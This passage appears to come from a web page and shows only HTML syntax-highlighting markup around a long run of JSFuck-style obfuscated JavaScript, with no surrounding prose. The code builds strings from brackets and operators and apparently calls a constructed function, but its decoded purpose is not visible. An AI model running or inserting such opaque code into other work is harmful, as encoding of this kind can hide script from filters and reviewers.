punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span 